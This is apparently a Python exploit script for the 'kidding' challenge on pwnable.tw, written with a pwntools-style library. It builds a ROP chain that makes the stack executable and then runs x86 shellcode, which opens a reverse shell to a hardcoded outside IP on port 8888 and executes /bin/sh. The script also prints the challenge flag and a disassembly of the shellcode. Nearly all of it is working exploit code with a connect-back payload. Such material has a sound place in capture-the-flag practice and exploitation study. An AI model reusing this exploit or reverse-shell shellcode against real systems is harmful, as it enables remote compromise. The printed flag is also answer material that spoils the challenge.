#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *
import os
import sys

exe = context.binary = ELF('./kidding')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10303)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x80c99b0
'''.format(**locals())

# -- Exploit goes here --

pop_edx = next(exe.search(asm("pop edx; ret")))
__stack_prot = 0x80e9fec
_dl_make_stack_executable = 0x809a080
__libc_stack_end = 0x80e9fc8
call_esp = 0x080c99b0
io = start()

rop = flat([
    p16(0x7),
    b'ABCDEF',
    p32(__libc_stack_end + __stack_prot),
    pop_edx,
    __stack_prot,
    0x08065410, #: mov ax, word ptr [ecx]; mov word ptr [edx], ax; mov eax, edx; ret;
    0x08054659, #: mov eax, dword ptr [ecx + 8]; sub eax, edx; ret; 
    _dl_make_stack_executable,
    call_esp,
])

rop += asm("""
    xchg eax, ebx
    push ebx
    inc  ebx
    push ebx
    push 2
    mov  ecx, esp
    push 0x66
    pop  eax
    int  0x80
    xchg   ebx,eax
    pop edx
    pop ecx
    mov  al, 0x3f
    int  0x80
""")

rop += b"\x68"
rop += b"\x8a\xc5\xb6\xb5" #IP => 138.197.182.181
rop += b"\x66\x68"
rop += b"\x22\xb8" #PORT => 8888
rop += b"\x66\x6a\x02"
rop += b"\x89\xe1\xb0\x66\x50"
rop += b"\x51\x53\xb3\x03\x89\xe1\xcd\x80"
rop += asm("""
    pop ecx
    push 0x0068732f
    push 0x6e69622f
    mov  ebx, esp
    xchg eax, edx
    mov  al, 0xb
    int  0x80
""")
# shellcode stolen from => https://packetstormsecurity.com/files/145701/Linux-x86-Reverse-Shell-Shellcode.html
io.send(rop)
FLAG = "FLAG{Ar3_y0u_k1dd1ng_m3}"
log.info(f"ROP LEN : {hex(len(rop))}")
io.interactive()
"""
0xa4:  xchg   ebx,eax
0xa5:  push   ebx
0xa6:  inc    ebx
0xa7:  push   ebx
0xa8:  push   0x2
0xaa:  mov    ecx,esp
0xac:  push   0x66
0xae:  pop    eax
0xaf:  int    0x80
0xb1:  xchg   ebx,eax
0xb2:  pop    edx
0xb3:  pop    ecx
0xb4:  mov    al,0x3f
0xb6:  int    0x80
0xb8:  push   0xb5b6c58a
0xbd:  pushw  0xb822
0xc1:  pushw  0x2
0xc4:  mov    ecx,esp
0xc6:  mov    al,0x66
0xc8:  push   eax
0xc9:  push   ecx
0xca:  push   ebx
0xcb:  mov    bl,0x3
0xcd:  mov    ecx,esp
0xcf:  int    0x80
0xd1:  pop    ecx
0xd2:  push   0x68732f
0xd7:  push   0x6e69622f
0xdc:  mov    ebx,esp
0xde:  xchg   edx,eax
0xdf:  mov    al,0xb
0xe1:  int    0x80
"""